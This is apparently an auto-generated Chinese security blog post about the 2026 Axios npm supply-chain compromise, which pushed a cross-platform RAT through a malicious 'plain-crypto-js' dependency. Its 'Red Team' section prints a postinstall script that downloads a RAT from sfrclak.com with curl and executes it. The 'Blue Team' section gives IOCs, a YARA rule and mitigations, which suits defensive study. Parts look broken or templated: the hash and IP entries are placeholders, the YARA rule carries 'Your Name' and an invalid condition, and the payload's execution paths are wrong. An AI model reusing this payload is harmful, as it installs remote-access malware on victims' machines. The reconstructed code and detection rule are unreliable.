---
layout: post
title:  "Axios Supply Chain Attack Pushes Cross-Platform RAT via Compromised npm Account"
date:   2026-03-31 07:04:38 +0000
categories: [security]
severity: critical
---

# 🚨 Axios 供應鏈攻擊：解析與防禦
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: 供應鏈攻擊、npm 資料庫污染、跨平台遠端存取木馬 (RAT)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Axios 的維護者帳戶 (`jasonsaayman`) 被攻擊者入侵，導致 Axios 的 npm 資料庫中出現了惡意版本 (`1.14.1` 和 `0.30.4`)，這些版本包含了一個名為 `plain-crypto-js` 的惡意依賴項。
* **攻擊流程圖解**:
  1. 攻擊者入侵 Axios 的維護者帳戶。
  2. 攻擊者發布惡意版本的 Axios，包含 `plain-crypto-js` 惡意依賴項。
  3. 使用者安裝惡意版本的 Axios。
  4. `plain-crypto-js` 惡意依賴項執行 postinstall 腳本，下載並執行 RAT。
* **受影響元件**: Axios 版本 `1.14.1` 和 `0.30.4`，以及 `plain-crypto-js` 版本 `4.2.1`。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: Axios 的維護者帳戶密碼或 npm 資料庫的寫入權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // plain-crypto-js 的 postinstall 腳本
    const childProcess = require('child_process');
    const os = require('os');
    
    // 下載 RAT
    const ratUrl = 'https://sfrclak.com:8000/rat';
    const ratPath = '/tmp/rat';
    
    childProcess.execSync(`curl -o ${ratPath} ${ratUrl}`);
    
    // 執行 RAT
    if (os.platform() === 'darwin') {
      // macOS
      childProcess.execSync(`./${ratPath} &`);
    } else if (os.platform() === 'win32') {
      // Windows
      childProcess.execSync(`start ${ratPath}`);
    } else {
      // Linux
      childProcess.execSync(`./${ratPath} &`);
    }
    
    ```
* **繞過技術**: 使用 Proton Mail 電子郵件地址來隱藏攻擊者的身份。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `plain-crypto-js` 的 SHA-256 雜湊值 |
| IP | `sfrclak.com` 的 IP 地址 |
| Domain | `sfrclak.com` |
| File Path | `/tmp/rat` (Linux/macOS) 或 `%PROGRAMDATA%\wt.exe` (Windows) |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule axios_supply_chain_attack {
      meta:
        description = "Axios 供應鏈攻擊"
        author = "Your Name"
      strings:
        $plain_crypto_js = "plain-crypto-js"
        $rat_url = "https://sfrclak.com:8000/rat"
      condition:
        any of ($plain_crypto_js.*) and any of ($rat_url)
    }
    
    ```
* **緩解措施**:
  1. 更新 Axios 至安全版本 (`1.14.0` 或 `0.30.3`）。
  2. 刪除 `plain-crypto-js` 依賴項。
  3. 檢查 CI/CD 管道是否安裝了受影響的版本。
  4. 阻止對 `sfrclak.com` 的流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **供應鏈攻擊 (Supply Chain Attack)**: 惡意攻擊者入侵軟體供應鏈中的某個環節，例如開發者帳戶或 npm 資料庫，以發布惡意軟體或依賴項。
* **npm 資料庫污染 (npm Registry Pollution)**: 惡意攻擊者在 npm 資料庫中發布惡意軟體或依賴項，以感染使用者系統。
* **跨平台遠端存取木馬 (Cross-Platform Remote Access Trojan)**: 一種可以在多個平台上運行的遠端存取木馬，允許攻擊者控制受感染的系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/axios-supply-chain-attack-pushes-cross.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1195/)


